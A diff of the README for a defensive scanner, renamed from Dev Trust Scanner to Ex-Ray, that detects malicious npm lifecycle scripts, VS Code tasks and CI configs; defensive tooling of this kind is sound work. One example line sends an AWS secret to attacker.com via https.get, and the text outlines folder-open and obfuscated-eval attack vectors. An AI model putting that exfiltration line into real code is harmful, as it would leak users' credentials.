@@ -1,15 +1,15 @@
-# Dev Trust Scanner
+# Ex-Ray
 
 > Open-source security scanner for detecting malicious patterns in developer tooling configurations
 
 [![Python Version](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/downloads/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Tests](https://img.shields.io/badge/tests-209%20passed-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)
-[![Coverage](https://img.shields.io/badge/coverage-92%25-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)
+[![Tests](https://img.shields.io/badge/tests-209%20passed-brightgreen)](https://github.com/ymlsurgeon/ex-ray)
+[![Coverage](https://img.shields.io/badge/coverage-92%25-brightgreen)](https://github.com/ymlsurgeon/ex-ray)
 
 ## Overview
 
-**Dev Trust Scanner** is a plugin-based CLI tool that detects malicious patterns in developer tooling configurations. It targets "developer autopilot moments" — attack surfaces where code executes without developer scrutiny.
+**Ex-Ray** is a plugin-based CLI tool that detects malicious patterns in developer tooling configurations. It targets "developer autopilot moments" — attack surfaces where code executes without developer scrutiny.
 
 ### The Problem
 
@@ -23,7 +23,7 @@ These attacks succeed because developers trust:
 2. VS Code tasks to be safe configuration files
 3. Git repositories shared during job interviews
 
-**Dev Trust Scanner** provides the missing security layer for these attack vectors.
+**Ex-Ray** provides the missing security layer for these attack vectors.
 
 ---
 
@@ -50,14 +50,14 @@ These attacks succeed because developers trust:
 
 ```bash
 # Clone repository
-git clone https://github.com/ymlsurgeon/dev-trust-scanner.git
-cd dev-trust-scanner
+git clone https://github.com/ymlsurgeon/ex-ray.git
+cd ex-ray
 
 # Install with pip
 pip install -e .
 
 # Verify installation
-dev-trust-scan --help
+exray --help
 ```
 
 ### Requirements
@@ -81,21 +81,21 @@ Minimal by design (supply chain security):
 
 ```bash
 # Scan current directory
-dev-trust-scan .
+exray .
 
 # Scan specific project
-dev-trust-scan /path/to/project
+exray /path/to/project
 
 # List available plugins
-dev-trust-scan --list-plugins
+exray --list-plugins
 ```
 
 ### Example Output
 
 ```bash
-$ dev-trust-scan ./suspicious-project
+$ exray ./suspicious-project
 
-🔍 Dev Trust Scanner v0.2.0
+🔍 Ex-Ray v0.2.0
 Scanning: ./suspicious-project
 Plugins: npm-lifecycle, vscode-tasks, github-actions
 
@@ -124,33 +124,33 @@ Summary: 1 critical, 1 high, 1 medium | 3 findings in 0.01s
 
 ```bash
 # Human-readable text (default)
-dev-trust-scan . --format text
+exray . --format text
 
 # JSON for programmatic parsing
-dev-trust-scan . --format json > results.json
+exray . --format json > results.json
 
 # SARIF 2.1.0 for CI/CD integration
-dev-trust-scan . --format sarif > results.sarif
+exray . --format sarif > results.sarif
 ```
 
 ### Plugin Filtering
 
 ```bash
 # Run only npm-lifecycle plugin
-dev-trust-scan . --plugin npm-lifecycle
+exray . --plugin npm-lifecycle
 
 # Run multiple specific plugins
-dev-trust-scan . --plugin npm-lifecycle --plugin vscode-tasks
+exray . --plugin npm-lifecycle --plugin vscode-tasks
 ```
 
 ### Verbose Logging
 
 ```bash
 # Info level logging
-dev-trust-scan . -v
+exray . -v
 
 # Debug level logging
-dev-trust-scan . -vv
+exray . -vv
 ```
 
 ---
@@ -220,7 +220,7 @@ Detects Contagious Interview-style attacks in `.vscode/tasks.json`:
 
 **Detection:**
 ```bash
-$ dev-trust-scan ./interview-project
+$ exray ./interview-project
 
 🔴 CRITICAL: Auto-executing task on folder open [VSC-001]
 🔴 HIGH: Suspicious shell command in task [VSC-003]
@@ -246,7 +246,7 @@ https.get('https://attacker.com/exfil?data=' + process.env.AWS_SECRET);
 
 **Detection:**
 ```bash
-$ dev-trust-scan .
+$ exray .
 
 🔴 MEDIUM: Network calls in lifecycle scripts [NPM-003]
    File: index.js (executed by 'preinstall')
@@ -254,7 +254,7 @@ $ dev-trust-scan .
 🟡 MEDIUM: Environment variable access [NPM-004]
 ```
 
-**Why this matters:** Many scanners only check package.json content and miss malicious code in referenced .js files. Dev Trust Scanner follows these references and scans the actual files.
+**Why this matters:** Many scanners only check package.json content and miss malicious code in referenced .js files. Ex-Ray follows these references and scans the actual files.
 
 ### Base64 Obfuscated Malware
 
@@ -270,7 +270,7 @@ $ dev-trust-scan .
 
 **Detection:**
 ```bash
-$ dev-trust-scan .
+$ exray .
 
 🔴 HIGH: Suspicious eval/exec [NPM-001]
 🔴 HIGH: Base64 encoded content [NPM-002]
@@ -304,14 +304,14 @@ jobs:
         with:
           python-version: '3.10'
 
-      - name: Install Dev Trust Scanner
+      - name: Install Ex-Ray
         run: |
-          pip install git+https://github.com/ymlsurgeon/dev-trust-scanner.git
+          pip install git+https://github.com/ymlsurgeon/ex-ray.git
 
       - name: Scan for malicious patterns
         run: |
-          dev-trust-scan . --format sarif > results.sarif
-          dev-trust-scan . || exit 1
+          exray . --format sarif > results.sarif
+          exray . || exit 1
 
       - name: Upload SARIF results
         uses: github/codeql-action/upload-sarif@v2
@@ -326,8 +326,8 @@ jobs:
 #!/bin/bash
 # .git/hooks/pre-commit
 
-echo "Running Dev Trust Scanner..."
-dev-trust-scan . --format text
+echo "Running Ex-Ray..."
+exray . --format text
 
 if [ $? -ne 0 ]; then
     echo "⚠️  Security issues detected. Commit blocked."
@@ -341,8 +341,8 @@ fi
 security_scan:
   stage: test
   script:
-    - pip install git+https://github.com/ymlsurgeon/dev-trust-scanner.git
-    - dev-trust-scan . --format json > gl-security-report.json
+    - pip install git+https://github.com/ymlsurgeon/ex-ray.git
+    - exray . --format json > gl-security-report.json
   artifacts:
     reports:
       security: gl-security-report.json
@@ -353,8 +353,8 @@ security_scan:
 ## 📊 Architecture
 
 ```
-dev-trust-scanner/
-├── src/dev_trust_scanner/
+ex-ray/
+├── src/exray/
 │   ├── cli.py                    # Click-based CLI
 │   ├── core/
 │   │   ├── models.py             # Pydantic data models (Finding, Rule, ScanResult)
@@ -392,7 +392,7 @@ dev-trust-scanner/
 pytest tests/ -v
 
 # With coverage report
-pytest tests/ --cov=dev_trust_scanner --cov-report=html
+pytest tests/ --cov=exray --cov-report=html
 
 # Specific plugin tests
 pytest tests/test_npm_lifecycle.py -v
@@ -418,12 +418,12 @@ pytest tests/test_integration.py -v
 
 1. **Create plugin directory:**
    ```bash
-   mkdir -p src/dev_trust_scanner/plugins/my_plugin/rules
+   mkdir -p src/exray/plugins/my_plugin/rules
    ```
 
 2. **Implement BasePlugin interface:**
    ```python
-   from dev_trust_scanner.core.plugin import BasePlugin
+   from exray.core.plugin import BasePlugin
    from pathlib import Path
 
    class MyPlugin(BasePlugin):
@@ -463,7 +463,7 @@ pytest tests/test_integration.py -v
 5. **Register in orchestrator:**
    ```python
    PLUGIN_REGISTRY = {
-       "my-plugin": "dev_trust_scanner.plugins.my_plugin"
+       "my-plugin": "exray.plugins.my_plugin"
    }
    ```
 
@@ -485,7 +485,7 @@ This is a **security tool** — we take security seriously:
 
 ### Reporting Security Issues
 
-Found a vulnerability in Dev Trust Scanner itself? Please report responsibly:
+Found a vulnerability in Ex-Ray itself? Please report responsibly:
 - Email: [Maintainer email - TBD]
 - Do NOT open public GitHub issues for security vulnerabilities
 
@@ -562,8 +562,8 @@ Contributions welcome! This tool is built to be extensible.
 
 ### Development Setup
 ```bash
-git clone https://github.com/ymlsurgeon/dev-trust-scanner.git
-cd dev-trust-scanner
+git clone https://github.com/ymlsurgeon/ex-ray.git
+cd ex-ray
 pip install -e ".[dev]"
 pytest tests/ -v
 ```
@@ -575,4 +575,4 @@ See `CLAUDE.md` for detailed development workflow and coding standards.
 **Status**: ✅ **MVP Complete** (v0.1.0) - Production Ready
 
 Built with ❤️ for the security community
-# dev-trust-scanner-action
+# ex-ray-action
